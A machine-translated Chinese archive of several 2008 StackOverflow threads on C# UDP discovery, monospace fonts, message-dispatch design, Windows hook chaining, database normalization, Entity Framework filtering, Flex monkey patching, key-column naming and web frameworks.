# StackOverflow 问答 000214000-000214999

# c# - 在 C# 中需要多播 udp 服务器发现方面的帮助

> ID：214009
> 
> 赞同：6
> 
> 时间：2008-10-17T22:11:20.663
> 
> 标签：c#, .net, udp, multicast

[作为对这个问题](https://stackoverflow.com/questions/210446/what-is-the-best-way-for-a-client-app-to-find-a-server-on-a-local-network-in-c)的一种跟进，我已经在我的本地机器上得到了一个解决方案，但在网络上的机器上却没有。

除了基础知识之外，我对套接字知之甚少，所以请耐心等待。目标是让客户端在本地网络上寻找服务器，这是一些剪切/粘贴/编辑代码的结果。

这是客户端代码：

```
IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 10294);

    byte[] data = new byte[1024];
    public Form1()
    {
        InitializeComponent();

    }

    private void button1_Click(object sender, EventArgs e)
    {

        Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        client.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.MulticastTimeToLive, 10);
        string welcome = "What's your IP?";
        data = Encoding.ASCII.GetBytes(welcome);
        client.SendTo(data, data.Length, SocketFlags.None, ipep);
        IPEndPoint server = new IPEndPoint(IPAddress.Any, 0);
        EndPoint tmpRemote = (EndPoint)server;
        data = new byte[1024];
        int recv = client.ReceiveFrom(data, ref tmpRemote);
        this.IP.Text = ((IPEndPoint)tmpRemote).Address.ToString(); //set textbox
        this.Port.Text = Encoding.ASCII.GetString(data, 0, recv); //set textbox
        client.Close();
    } 
```

这是服务器代码：

```
int recv;
        byte[] data = new byte[1024];
        IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 10294);
        Socket newsock = new Socket(AddressFamily.InterNetwork,
                SocketType.Dgram, ProtocolType.Udp);
        newsock.Bind(ipep);
        newsock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.AddMembership, new MulticastOption(IPAddress.Any,IPAddress.Parse("127.0.0.1")));

        while (true)
        {
            Console.WriteLine("Waiting for a client...");
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
            EndPoint tmpRemote = (EndPoint)(sender);
            data = new byte[1024];
            recv = newsock.ReceiveFrom(data, ref tmpRemote);
            Console.WriteLine("Message received from {0}:", tmpRemote.ToString());
            Console.WriteLine(Encoding.ASCII.GetString(data, 0, recv));
            string welcome = "7010";
            data = Encoding.ASCII.GetBytes(welcome);
            newsock.SendTo(data, data.Length, SocketFlags.None, tmpRemote);
        } 
```

它可以在我的本地机器（服务器和客户端）上找到，但是当我在同一网络上尝试另一台机器时，我得到“现有连接被远程主机强行关闭”

我意识到我需要添加很多尝试/捕获，但我只是想先了解它是如何工作的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T05:25:38.867

我必须首先说我对 C# 一无所知，但是......

查看客户端代码中的定义`ipep`，您似乎正在尝试将数据发送给自己，而不是广播它（正如您在其他问题中所建议的那样）。引起我注意的是“127.0.0.1”是“localhost”的地址。

这可以解释为什么当您在一台机器上同时运行客户端和服务器时它工作得很好，因为它*会*发送给自己。

我希望正确的端点是广播地址（例如“255.255.255.255”） - 尽管您也可以选择您所在本地网络的广播地址，具体取决于您希望广播的范围。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2010-03-04T20:57:51.667

```
IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 10294); 
```

应该变成：

```
IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("255.255.255.255"), 10294); 
```

和

```
newsock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.AddMembership, new MulticastOption(IPAddress.Any, IPAddress.Parse("127.0.0.1"))); 
```

应该成为

```
newsock.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.AddMembership, new MulticastOption(IPAddress.Any, IPAddress.Parse("255.255.255.255"))); 
```

我认为。

好的，这不起作用，所以还是有问题。

# fonts - 在 Modelsim 中广泛使用的最易读的固定宽度字体是什么

> ID：214012
> 
> 赞同：0
> 
> 时间：2008-10-17T22:11:46.310
> 
> 标签：fonts, modelsim

Modelsim 是一个 HDL 模拟器，允许您指定输出使用的字体。定宽字体可以让输出更有序，但是很多定宽字体在眼睛上并不容易。你会推荐什么？我目前使用 Lucida 控制台。

根据一些建议，我已经尝试过 Inconsolata 和 Consolas，但 Modelsim 在 10 点时并不能很好地呈现它们。我不确定为什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-17T22:16:55.037

请参阅此问题的答案：[推荐的编程字体？](https://stackoverflow.com/questions/4689/recommended-fonts-for-programming)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T22:17:49.170

ProFont 是一款非常不错的定宽字体。您可以在[此处](http://www.tobias-jung.de/seekingprofont/)找到适用于各种操作系统的它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T22:18:11.553

同意。Consolas 是 Microsoft 为 Windows Vista 推出的新的固定宽度字体，并提供了许多引人注目的功能，包括易读性。它还可以与 ClearType 技术很好地配合使用。如果您想查看它与 Courier New 之间的比较，请查看 Wikipedia 页面。

[http://en.wikipedia.org/wiki/Consolas](http://en.wikipedia.org/wiki/Consolas)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-17T22:22:09.113

[Terminus](http://fractal.csie.org/~eric/wiki/Terminus_font)字体至少在 Linux 中很流行。[这里](http://www.lowing.org/fonts/)有一个包含大量不同大小样本的页面，在页面上搜索“Terminus”。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-19T18:17:28.530

[Andale Mono](http://sourceforge.net/project/downloading.php?groupname=corefonts&filename=andale32.exe&use_mirror=superb-east)适合我。我不知道modelsim是什么，但它似乎以一种特殊的方式呈现字体。很多其他的看起来不太好，好像它们太抗锯齿了。我认为不是字体的错。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-17T22:19:29.633

[Droid Sans Mono](http://damieng.com/blog/2007/11/14/droid-sans-mono-great-coding-font)和[Bitstream Vera Sans Mono](http://www.bitstream.com/font_rendering/products/dev_fonts/vera.html)都获得了自由许可，并且在我看来非常易读（远远超过 Windows 附带的任何字体，包括 Lucida Console）。

# c# - 最佳表/枚举驱动方法调用系统

> ID：214017
> 
> 赞同：2
> 
> 时间：2008-10-17T22:13:13.750
> 
> 标签：c#, java

考虑我正在与一个外部系统连接，该系统将以某种格式发送消息（数据库表、消息队列、Web 服务）。在“消息头”中有一个“MessageType”，它是一个从 1 到 20 的数字。MessageType 定义了如何处理消息的其余部分。有新的，修改的，删除的，取消的......

我的第一个倾向是设置一个枚举并定义所有类型。然后将数字解析为枚举类型。使用它作为枚举，我将设置典型的 switch case 系统并为每种消息类型调用特定的方法。

一个大问题是维护。
开关/外壳系统体积庞大且乏味，但它非常简单。
其他人可能难以理解各种表格/配置系统并添加新消息或调整现有消息。

对于 12 种左右的 MessageType，switch/case 系统似乎很合理。切换到表驱动系统的合理截止点是什么？

什么样的系统被认为最适合处理这些类型的问题？

我在这里为 C# 和 Java 设置了一个标签，因为这绝对是一个常见问题。有许多其他语言有同样的问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-17T22:20:49.647

在 Java 中，您可以将其设为枚举并为不同的值赋予行为（尽管有 100 个值，但我希望每种行为都是简短的，调用“正确的”类）。

在 C# 中，您可以将值映射到某个适当的委托类型 - 然后当您静态构造该映射时，您可以根据需要使用 lambda 表达式或方法组转换。

话虽如此，设置地图将与 switch 语句一样难看。如果每个 switch 语句只是一个方法调用，您可能想尝试这种格式：

```
switch (messageType)
{
    case   0: HandleLogin(message);         break;
    case  50: SaveCurrentDocument(message); break;
    case 100: HandleLogout(message);        break;
} 
```

（ETC）。我知道这违反了正常惯例，但对于像这种奇怪的特殊情况来说，它可能非常简洁。如果你只需要一个地方的数字，那么引入常量就没有什么意义了——基本上包含数字的行*就是*常量定义！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T22:43:21.223

如何`Dictionary<MessageType, ProcessMessageDelegate>`通过消息类型来存储这些方法？在类的初始化过程中，注册这个字典中的所有方法。然后调用相应的方法。以下是伪代码：

```
 delegate void ProcessMessageDelegate(Message message)

  public class MyMessageProcessor
  {
    Dictionary<int, ProcessMessageDelegate> methods;

    public void Register( int messageType, 
                          ProcessMessageDelegate processMessage)
    {
      methods[messageType] = processMessage;
    }

    public void ProcessMessage(int messageType, Message message)
    {
      if(methods.ContainsKey(messageType))
      {
        methods[messageType](message);
      }
    }
  } 
```

注册方法：

```
 myProcessor.Register(0, ProcessMessageOfType0);
   myProcessor.Register(1, ProcessMessageOfType1);
   myProcessor.Register(2, ProcessMessageOfType2);
   ... 
```

**编辑**：我意识到乔恩已经建议有一张地图，现在让我的答案变得多余。但我不明白为什么静态构造的地图比 switch case 更丑？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-18T05:01:10.320

有一个像这样的处理程序接口：

```
interface MessageHandler {
   void processMessage(Message msg) throws Exception;
   int[] queryInterestingMessageIds();
   int queryPriority(int messageId); // this one is optional
} 
```

定位、实例化和注册您的处理程序。您可能希望使用一些基于反射的机制，例如[ServiceLoader](http://java.sun.com/javase/6/docs/api/java/util/ServiceLoader.html)、 Spring（显式配置或[类路径扫描](http://static.springframework.org/spring/docs/2.5.x/reference/beans.html#beans-classpath-scanning)以及可能的自动装配）或普通属性文件

注册应该将每个处理程序传递给 WhatManager 类，该类将在内部保存处理程序集合的映射（或由消息 ID 索引的数组）。如果您希望有多个处理程序，您可以使用*queryPriority(int)*方法来解决处理顺序（否则您可以将其视为错误并在配置时抛出异常）。最好不要使用静态地图进行注册。

如果您决定支持一条消息的多个处理程序，您可能需要菊花链式连接它们。在这种情况下，一种方法是按如下方式更改签名：

```
 Message processMessage(Message msg, Message original) throws Exception; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-17T23:47:45.150

这就是我在 C# 中所做的。

我认为这种方法实际上并没有那么难看，随着消息类型数量的增加，它变得不那么难看：要实现新的消息类型，您只需向 Enum 添加一个值并将新的消息处理程序类标记为一个属性。

在某些情况下，能够在运行时从程序集中加载消息处理程序是一项非常强大的功能；您可以拥有一个行为不同的可执行文件，具体取决于安装的消息处理程序程序集。

首先为消息处理程序创建一个接口（我们称之为它`IMessageHandler`）和一个用于消息类型的 Enum（我们称之为它`MessageType`）。

接下来，创建一个名为的类`MessageHandlerAttribute`：

```
public class MessageHandlerAttribute : System.Attribute
{
    public MessageType MessageType { get; set; }
} 
```

现在将每个消息处理程序实现为一个单独的类，并用其消息类型属性标记每个类。如果消息处理程序可以处理多种类型的消息，则可以在其上放置多个属性：

```
[MessageHandler(MessageType=MessageType.Login)]
public class LoginMessageHandler : IMessageHandler
{
    ...
} 
```

这些消息处理程序都具有无参数构造函数，这一点很重要。我想不出你希望消息处理程序的构造函数接受参数的充分理由*，*但如果有的话，下面的代码将无法处理它。

将所有消息处理程序构建到同一个程序集中，并确保您有办法在运行时知道它的路径。（这是这种方法的最大失败点。）

现在我们可以使用反射在运行时构建消息处理程序的映射：

```
using System.Reflection;
...
Assembly mhAssembly = Assembly.LoadFrom(mhAssemblyPath);
Dictionary<MessageType, IMessageHandler> mhMap = new Dictionary<MessageType, IMessageHandler>();
foreach (Type t in mhAssembly.GetExportedTypes())
{
   if (t.GetInterface("IMessageHandler") != null)
   {
      MessageHandlerAttribute list = (MessageHandlerAttribute[])t.GetCustomAttributes(
         typeof(MessageHandlerAttribute), false);
      foreach (MessageHandlerAttribute att in list)
      {
         MessageType mt = att.MessageType;
         Debug.Assert(!mhMap.ContainsKey(mt));
         IMessageHandler mh = mhAssembly.CreateInstance(
            t.FullName,
            true,
            BindingFlags.CreateInstance,
            null,
            new object[] { },
            null,
            null);
         mhMap.Add(mt, mh);
      }
   }
   // depending on your application, you might want to check mhMap now to make
   // sure that every MessageType value is in it.
}
return mhMap; 
```

现在，当您收到一条消息时，您可以像这样处理它：

```
Debug.Assert(MhMap.ContainsKey(Message.MessageType));
IMessageHandler mh = MhMap[Message.MessageType];
mh.HandleMessage(Message); 
```

这段代码都是基于我现在在生产系统中的代码；我稍微改变了它（以便消息处理程序实现一个接口而不是从抽象类派生，并且它处理多个消息处理程序属性），这可能已经引入了错误。

# windows - 如何正确使用 SetWindowsHookEx & CallNextHookEx

> ID：214022
> 
> 赞同：13
> 
> 时间：2008-10-17T22:16:50.823
> 
> 标签：windows, winapi, hook

我可以正确设置一个 Windows 挂钩，但我对 MSDN 中的一行感到困惑：“调用 CallNextHookEx 函数以链接到下一个挂钩过程是可选的，但强烈建议这样做；否则，其他已安装挂钩的应用程序将不会收到挂钩通知，因此可能会导致行为不正确。除非您绝对需要阻止其他应用程序看到通知，否则您应该调用 CallNextHookEx。"。

我想成为一名优秀的编程公民并调用下一个钩子。但是，我的钩子程序如下所示：

```
LRESULT CALLBACK CBTProc(int code, WPARAM wp, LPARAM lp)
{
    if (code != HCBT_CREATEWND)
        {
                // What do I do here? It's not the event I requested so how do I pass it on?
        return 0;
    }

    // It's the code we want (create window)
        CallNextHookEx(...);
        ...
} 
```

那么，如果代码不是我感兴趣的代码，那么在钩子过程中会发生什么？我如何调用下一个钩子？

**编辑：**主要问题是从 SetWindowsHookEx 返回 HHOOK，并且需要将其传递给 CallNextHookEx 函数。

**更新：**似乎在 NT 平台上忽略了 hook 参数：http:
[//msdn.microsoft.com/en-us/library/ms644974.aspx](http://msdn.microsoft.com/en-us/library/ms644974.aspx)
[http://www.klenotic.com/pl/null_hhook/](http://www.klenotic.com/pl/null_hhook/)

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-10-17T22:31:12.497

根据文档，正确的做法是将您收到的参数直接传递给 CallNextHookEx，就像您收到它们一样。无论您是否决定处理挂钩消息，您还应该调用 CallNextHookEx。

[根据 MSDN](http://msdn.microsoft.com/en-us/library/ms644974.aspx)，第一个参数 to`CallNextHookEx`在 NT/XP/2003 上被忽略，对于较旧的基于 Win95 的操作系统，它应该是`HHOOK`您在注册挂钩时收到的`SetWindowsHookEx`. 文档没有指定 Windows 2000 的值，但由于它是 NT 系列的一部分，因此合理的猜测是它在那里也被忽略了。

鉴于所有这些，为 NT 系列操作系统编写方法的一种好方法可能是：

```
LRESULT CALLBACK CBTProc( int code, WPARAM wp, LPARAM lp )
{
    if( code == HCBT_CREATEWND )
        ProcessCreateWnd( wp, lp );
    return CallNextHookEx( 0, code, wp, lp );
}

void ProcessCreateWnd( WPARAM wp, LPARAM lp )
{
    // my code here
} 
```

这样可以确保您始终在处理结束时调用钩子，并且很难意外添加`return`会绕过`CallNextHookEx`.

# mysql - 数据库非规范化机会

> ID：214024
> 
> 赞同：2
> 
> 时间：2008-10-17T22:17:14.023
> 
> 标签：mysql, database, database-design, denormalization, normalizing

我正在寻找一种策略，以阻止重复分支表的问题。例如，作为一个虚构的用例，假设我有一个包含用户名、登录名、密码和其他元数据的用户表。在这个特定的场景中，假设用户被限制为每个特定的 IP 子集登录。因此，我们有一个 1:M 的关系。每次出现诸如以下的用例时，您的正常工作流程包括拥有一个“用户”表和一个诸如“user_ips”之类的表，在这种情况下，您将拥有诸如 pk(ip_id)、fk( user_id) 和 user_ips 端的 IP。

对于类似的情况，你们通常会按照上面的方式扇出吗？这里有机会有效地去规范化吗？也许以某种 CSV 分隔的方式将 IP 存储在 BLOB 列中？你们今天正在部署哪些策略？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-17T23:00:30.690

*非规范化的*机会？*我认为您可能误解了传统智慧 - 非规范化是一种*优化*技术。不是你出去寻找的东西。*

 ** * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-17T22:37:15.197

我怀疑，当潜在相关项目的数量很大时，任何规范化的解决方案都会在正确索引的情况下执行非规范化的解决方案。我的策略是规范化数据库，然后提供视图或基于表的函数，利用索引连接来使成本可以承受。我会让性能要求决定向非规范化形式的转变。

请记住这一点。如果您需要对部分信息实施基于角色的安全访问，则基于表的安全性比基于列的安全性更容易实现，尤其是在数据库或数据层级别。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-10-17T22:52:32.983

我强烈建议**不要**在一个字段中放置多个 IP 地址。没关系 3NF 这打破了 1NF。

[Tvanfsson](https://stackoverflow.com/questions/214024/database-denormalization-opportunity#214063)是对的，如果您索引 FKEY，您将获得相当可观的性能，除非“users_ips”表中有数百万条记录。

更好的是，通过保持这些表的规范化，您实际上可以在将来报告这些信息，这样当用户对为什么他们无法从某些 LAN 登录感到困惑时，编写应用程序（或 SQL）来排除故障并执行用户操作IP查找会容易**得多**。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-17T22:23:48.470

一种选择是将您的 IP 地址存储为 xml 字符串。我认为这会比逗号分隔的列表更好，并且允许您在需要时灵活地将其他元素添加到字符串中（想到端口）而无需更改数据库。

虽然，我认为在大多数情况下标准化的时尚更好。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-17T22:59:53.593

与任何非规范化问题一样，您需要考虑与之相关的成本。特别是，如果您在主表中列出 IP 地址，您将如何回答“哪些用户可以与 IP 地址 wxyz 关联？”的问题。使用完全规范化的形式，这很容易并且与“哪些 IP 地址可以与用户 pqr 相关联？”对称。对于非规范化形式，问题的答案非常不同。此外，通常在非规范化版本中，确保应用正确的完整性规则要困难得多。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-11-19T00:22:06.610

恕我直言，这完全是关于成本/收益分析。一切都取决于您正在使用的平台的要求（包括可能的要求）和功能。

例如，如果您有“显示系统中记录的所有唯一 IP 地址”之类的要求，那么您最好现在“分支”并创建一个单独的表来存储 IP 地址。或者，如果您需要对 IP 地址进行某些限制（例如“给定用户的所有 IP 地址必须是唯一的），那么您可能会从单独的表和对其应用适当的限制中受益匪浅。（请注意，您甚至可以同时满足这两个要求如果您使用了非规范化设计和适当的与 XML 相关的机制；但是，针对这些要求的基于 RelDB 的解决方案似乎实现和维护起来要便宜得多。）

显然，这些并不是要求规范化解决方案的唯一示例。

同时，我认为“显示用户的所有 IP 地址”或“显示与给定 IP 地址关联的所有用户”之类的要求可能不足以证明标准化解决方案的合理性。

您可以尝试进行更深入的分析（寻找第一类需求），或者仅仅依靠您对项目上下文（当前和未来）的理解以及您的“直觉”。

在这种特殊情况下，我自己的“胆量”是第一种类型的要求（亲规范化要求）极有可能，因此从一开始就使用规范化解决方案会更好。但是，您已经说过这个用例是虚构的，因此在您的实际情况下，结论可能完全相反。

永远不要说“从不”：3NF 并不总是最好的答案。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-17T23:16:42.123

您可能需要考虑一个用户属性表和属性类型表，您可以在其中定义用户可以拥有的属性类型。每个新的用例都将成为一种属性类型，并且数据将简单地添加到用户属性表中。

使用您的 IP 地址示例，您将拥有 IP 属性类型并将相应的 IP 存储在用户属性表中。这使您可以灵活地添加其他类型，例如 MAC 地址，并且不需要您创建新表来支持新的数据类型。对于每个新用例，您不必添加任何数据。

不利的一面是，鉴于此属性结构，您的查询会稍微复杂一些。

# .net - 根据关联值过滤 EntityDataSource

> ID：214037
> 
> 赞同：4
> 
> 时间：2008-10-17T22:23:44.540
> 
> 标签：.net, linq, entity-framework, linq-to-entities

我真的很喜欢 Entity Framework，但有一些关键部分对我来说是一个挑战。谁能告诉我如何过滤关联列上的 EntityDataSource ？EF 隐藏了 FK 值，而是有一个 Association 属性。给定一个具有 PersonType 关联的实体 Person，如果我想按类型过滤我的 Person 实体，我会期望这样的事情：

```
GridDataSource.EntityTypeFilter = "it.PersonType.PersonTypeID = 1"; 
```

或者

```
GridDataSource.Where = "it.PersonType.PersonTypeID = '1'"; 
```

甚至

```
GridDataSource.WhereParameters.Add(new Parameter("it.PersonType.PersonTypeID", DbType.Object, "1")); 
```

但这些都不起作用。有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-23T19:02:14.793

我认为您正在寻找的答案涉及使用 Include 方法，例如：

```
entities.it.Include("PersonType").Where(a => a.PersonType.PersonTypeID = '1'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-12T15:58:22.727

您是否尝试过使用 LINQ 在内存中应用过滤器？（或者也许针对数据库？）

```
var personType = new PersonType { Id = 1 };
var query = PersonDataSource.Where(p => p.PersonType.Equals(personType));
// use this query as the DataSource for your GridView 
```

我必须承认我没有做过这样的事情，但我已经使用这个技巧来更新/创建一个实体，而无需先加载关联的实体。

# apache-flex - 作为 RSL 加载时的猴子补丁 flex 框架？

> ID：214044
> 
> 赞同：1
> 
> 时间：2008-10-17T22:26:07.420
> 
> 标签：apache-flex, monkeypatching, rsl

我想将 flex 框架加载为 RSL（SWZ，使用播放器缓存），但我需要修补框架中的几个错误修复。

许多论坛认为这是不可能的。有没有人让这个工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-06-17T05:30:43.643

与使用 frame1 的其他答案相同，但 James Ward 有一些代码可以查看：[http ://www.jamesward.com/blog/2009/03/10/flex-monkey-patching-and-framework-rsls/](http://www.jamesward.com/blog/2009/03/10/flex-monkey-patching-and-framework-rsls/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-20T15:00:59.970

我相信只有 Adob​​e 签名的库才能利用跨域播放器缓存机制。既然你的不会，那就不能。

应该可以创建不利用播放器缓存的 RSL。如果您有多个 flex 应用程序在同一个域上都使用相同的 Flex SDK RSL，并且您将让浏览器缓存它们，这可能会很有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-10-05T08:25:28.790

这是另一种为猴子修补类创建单独的 RSL 的解决方案 - [http://www.hrundik.ru/blog/](http://www.hrundik.ru/blog/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-06-11T17:01:55.577

创建一个自定义预加载器以供使用并在其中包含您覆盖的类 - 该预加载器在任何 RSL（例如框架 RSL）之前加载，因此将首先出现猴子补丁类并覆盖框架类。

您可以通过此模式强制包含一个类（将其放在您的客户 Preloader 类中）

导入 com.yourclass.ClassName

私有 var emptyVariableTriggerInclusionOfImportedClass:ClassName

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-11-29T07:11:27.920

大约一个月前，我团队中的一个人尝试过这个，并说他没有问题。如果您的猴子补丁类是您的应用程序项目的一部分，那么它应该可以工作，因为它们被编译到 SWF 中并且基本上“覆盖”了框架中的内容。您没有更改 Flex 框架 RSL，因此它仍应正常加载和缓存。Adobe 没有发布太多来解释这一点，但这就是我理解它的工作方式。

# sql - 为什么在列名中指定主/外键属性

> ID：214045
> 
> 赞同：3
> 
> 时间：2008-10-17T22:26:29.150
> 
> 标签：sql, naming-conventions, foreign-keys

最近的几个问题讨论了命名列的策略，我很惊讶地发现在列名中嵌入外键和主键的概念。那是

```
select t1.col_a, t1.col_b, t2.col_z
from t1 inner join t2 on t1.id_foo_pk = t2.id_foo_fk 
```

我不得不承认我从来没有在任何使用这种方案的数据库系统上工作过，我想知道有什么好处。在我看来，一旦您了解了系统的 N 个主表，您将使用这些表编写多个数量级的请求。

为了提高开发效率，您需要了解哪些表是重要的表，哪些是简单的支流。您需要将大量列名提交到内存中。其中一项基本任务是将两个表连接在一起。为了减少学习工作量，最简单的做法是确保两个表中的列名相同：

```
select t1.col_a, t1.col_b, t2.col_z
from t1 inner join t2 on t1.id_foo = t2.id_foo 
```

我认为，作为开发人员，您不需要过多地提醒哪些列是主键，哪些是外来的，哪些什么都不是。如果您很好奇，可以很容易地查看架构。随意看的时候

```
tx inner join ty on tx.id_bar = ty.id_bar 
```

...知道哪个是外键重要吗？外键仅对数据库引擎本身很重要，以允许它确保引用完整性并在更新和删除期间做正确的事情。

这里要解决什么问题？（我知道这是一个讨论的邀请，并且可以随意这样做。但与此同时，我*正在*寻找答案，因为我可能真的错过了一些东西）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-17T22:31:28.253

我同意你的看法。将此信息放在列名中带有早期 Windows 时代蹩脚的匈牙利符号白痴的味道。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-17T23:17:20.220

我同意您的观点，即子表中的外键列应与父表中的主键列同名。请注意，这允许如下语法：

```
SELECT * FROM foo JOIN bar USING (foo_id); 
```

USING 关键字假定两个表中存在同名的列，并且您需要等值连接。很高兴将其用作更详细的简写：

```
SELECT * FROM foo JOIN bar ON (foo.foo_id = bar.foo_id); 
```

但是请注意，在某些情况下，您不能将外键命名为与其引用的主键相同的名称。例如，在具有自引用的表中：

```
CREATE TABLE Employees (
  emp_id INT PRIMARY KEY,
  manager_id INT REFERENCES Employees(emp_id)
); 
```

此外，一个表可能对同一个父表有多个外键。使用列的名称来描述关系的性质很有用：

```
CREATE TABLE Bugs (
  ...
  reported_by INT REFERENCES Accounts(account_id),
  assigned_to INT REFERENCES Accounts(account_id),
  ...
); 
```

我不喜欢在列名中包含表的名称。我还避免将强制性“id”作为每个表中主键列的名称。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-18T00:19:56.880

在我用 SQL 数据库开发的 20 年里，我一直支持这里提出的大部分想法，我很尴尬地说。他们中的大多数人几乎没有或根本没有提供预期的好处，事后看来，这是一种颈部疼痛。

每当我在架构上花费了几个小时以上的时间时，我都会很快熟悉最重要的表及其列。一旦到了几个月，我几乎会把整个事情都放在我的脑海里。

这一切的解释是为了谁？一个只花几分钟设计的人无论如何都不会做任何严肃的事情。如果您用梵文命名您的列，那么计划长期使用它的人将会学习它。

忽略复合主键，我不明白为什么像“id”这样简单的东西不能满足主键，而“_id”不能满足外键。

所以一个典型的连接条件变成了`customer.id = order.customer_id`。

在两个表之间存在多个关联的情况下，我倾向于使用关联而不是表名，因此可能是“parent_id”和“child_id”而不是“parent_person_id”等

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-17T22:48:01.277

我只使用带有 Id 后缀的表名作为主键，例如 CustomerId，从其他表中引用的外键也称为 CustomerId。当您在应用程序中引用时，对象属性中的表格变得很明显，例如 Customer.TelephoneNumber、Customer.CustomerId 等。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T22:45:17.740

我在表的任何外键的前端使用了“fk_”，主要是因为它帮助我在为我的商店的项目开发数据库时保持直线。过去没有做过任何数据库工作，这确实帮助了我。事后看来，也许我不需要这样做，但它是在某些列名上附加了三个字符，所以我没有出汗。

作为一个编写数据库应用程序的新手，我可能做出了一些决定，这会让经验丰富的数据库开发人员不寒而栗，但我不确定外键是否真的有那么大。再说一次，我想这是对这个问题的看法不同，我肯定会接受你所写的内容并对此进行思考。

祝你有个好的一天！

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-10-17T22:32:57.297

我同意你的看法——我采取了一种不同的方法，我在许多公司环境中都看到了这种方法：

*以TableNameFieldName*格式命名列，因此如果我有一个 Customer 表并且 UserName 是我的字段之一，那么该字段将被称为 CustomerUserName。这意味着，如果我有另一个名为 Invoice 的表，并且客户的用户名是外键，我会称之为 InvoiceCustomerUserName，当我引用它时，我会称之为 Invoice.CustomerUserName，它会立即告诉我它在哪个表中。

此外，此命名有助于您在加入时跟踪列来自的表。

我只在 DBMS 的外键和主键的实际名称中使用 FK_ 和 PK_。

# architecture - 您使用什么进行 Web 开发以及为什么您认为它很摇滚？

> ID：214057
> 
> 赞同：5
> 
> 时间：2008-10-17T22:32:21.353
> 
> 标签：architecture, frameworks

这是我的新项目：一个开放的画布，就在我面前。几天后，我将开始编写一个大型 Web 应用程序。它将从很小的模块开始，只有我自己作为开发人员和工程师，但希望它会不断发展壮大。

尽管我是一名活跃的 Java 开发人员，但距离我上次从头开始创建 Web 应用程序已经有一段时间了。当时，Struts 和 J2EE 是要走的路，但我看到每天都有很多新框架、新库出现。

我在这里问的是您的建议：您目前在 Web 开发中使用什么，为什么您认为它是相关的，以及如果您开始一个新项目时是否会选择相同的工具。一切都很重要：从 UI 上的提示到后端。常见的陷阱、模式，所有你能想到的都可能是相关的。

我是一名 Java 开发人员，我自然倾向于使用与 Java 相关的技术（J2SE、J2EE、Groovy、Grails、JRuby、Jython、JWhatever 等）来做任何事情，但欢迎发表任何你喜欢的东西使用，是否与 Java 相关。

我在这里的目标是建立一个关于人们在做什么以及他们为什么这样做的桶，以帮助我评估我应该走哪条路，我不应该走哪条路——以及为什么。毕竟，您并非每天都有如此自由的决定权。

提前致谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-17T23:44:21.240

我使用 Django。对我来说，主要原因是自动管理生成。这意味着我创建了模型对象，而 Django 工具为我生成了 SQL DDL——我将它应用到我的数据库中，并且 Django 有一个完全生成的管理网站供我对这些数据执行 CRUD 操作。它会根据类型、搜索等选择好的控件。如果我想调整管理员，我可以创建一些类来做到这一点。

Django 还有很多其他的好处（简单的模板语言、使用 python、易于托管等），但管理员是我选择它而不是 RoR 的原因。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-17T22:48:56.687

我最近一直在使用 TurboGears，非常喜欢它。它与 Django 和 Ruby On Rails 竞争快速开发，但具有更灵活的后端。也就是说，它更像是一组可以很好地协同工作的同类最佳组件，而不是一个单一的整体框架。如果需要，您可以轻松地更换对象关系映射器，或者用其他东西替换页面模板语言，而无需重写整个应用程序。

真正的“你这辈子都去哪儿了？” 我花了大约两分钟的时间在表单中添加了一个[AJAX 自动完成字段](http://docs.turbogears.org/1.0/AutoCompleteField)。我必须编写一个函数来回答 AJAX 请求并添加一个调用该函数的新字段，并且它第一次完美运行。我一直想玩 AJAX，但有点害怕，我第一次体验它再简单不过了。

它有一个[20 分钟的教程](http://docs.turbogears.org/1.0/Wiki20/Page1)来制作一个功能性的 wiki。即使您认为自己不会使用它，也请阅读或观看它，看看这样的事情是多么容易。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-19T20:48:14.090

